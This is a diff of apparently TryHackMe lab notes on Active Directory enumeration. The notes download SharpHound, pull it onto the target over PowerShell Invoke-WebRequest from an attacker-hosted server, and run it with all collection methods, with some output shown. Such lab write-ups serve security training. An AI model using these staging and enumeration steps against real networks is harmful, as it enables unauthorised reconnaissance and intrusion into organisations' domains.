@@ -6,8 +6,10 @@ import into the Bloodhound interface.
 
 On the attack machine:
 
-    mkdir sharphound 
+    mkdir sharphound
+    
     cd sharphound 
+    
     wget https://github.com/BloodHoundAD/SharpHound/releases/download/v1.1.0/SharpHound-v1.1.0.zip
     --2022-10-12 14:20:23--  https://github.com/BloodHoundAD/SharpHound/releases/download/v1.1.0/SharpHound-v1.1.0.zip
     ...
@@ -31,41 +33,22 @@ Now `ssh` into target machine using the credentials given:
 In the target machine terminal, switch to powershell:
 
     za\kenneth.davies@THMJMP1 C:\Users\kenneth.davies\Documents>powershell
-    Windows PowerShell
-    Copyright (C) Microsoft Corporation. All rights reserved.
  
 Choose a directory to work from (I used `Documents`, and download the 
 `SharpHound-v1.1.0.zip` from the http server on the attack machine:
 
     PS C:\Users\kenneth.davies\Documents> Invoke-WebRequest http://10.50.16.168/SharpHound-v1.1.0.zip -OutFile SharpHound-v1.1.0.zip
-    PS C:\Users\kenneth.davies\Documents> dir
-    
-    Mode                LastWriteTime         Length Name
-    ----                -------------         ------ ----
-    -a----       10/12/2022   2:48 PM        2138953 SharpHound-v1.1.0.zip
 
 Extract:
 
-    PS C:\Users\kenneth.davies\Documents> Expand-Archive SharpHound-v1.1.0.zip      
-    PS C:\Users\kenneth.davies\Documents> dir
-    Directory: C:\Users\kenneth.davies\Documents
-    
-    Mode                LastWriteTime         Length Name
-    ----                -------------         ------ ----
-    d-----       10/12/2022   2:49 PM                SharpHound-v1.1.0
-    -a----       10/12/2022   2:48 PM        2138953 SharpHound-v1.1.0.zip
+    PS C:\Users\kenneth.davies\Documents> Expand-Archive SharpHound-v1.1.0.zip
 
 Enumerate:
 
     PS C:\Users\kenneth.davies\Documents> cd SharpHound-v1.1.0
  
     PS C:\Users\kenneth.davies\Documents\SharpHound-v1.1.0> .\SharpHound.exe --CollectionMethods All --Domain za.tryhackme.com --ExcludeDCs  2022-10-12T14:49:52.7476245+01:00|INFORMATION|This version of SharpHound is compatible with the 4.2 Release of BloodHound
-    2022-10-12T14:49:53.2159956+01:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
     ...
-    2121 name to SID mappings.
-     0 machine sid mappings.
-     2 sid to domain mappings.
-     0 global catalog mappings.
     2022-10-12T14:50:42.7872718+01:00|INFORMATION|SharpHound Enumeration Completed at 2:50 PM on 10/12/2022! Happy Graphing!
 
 Check results:
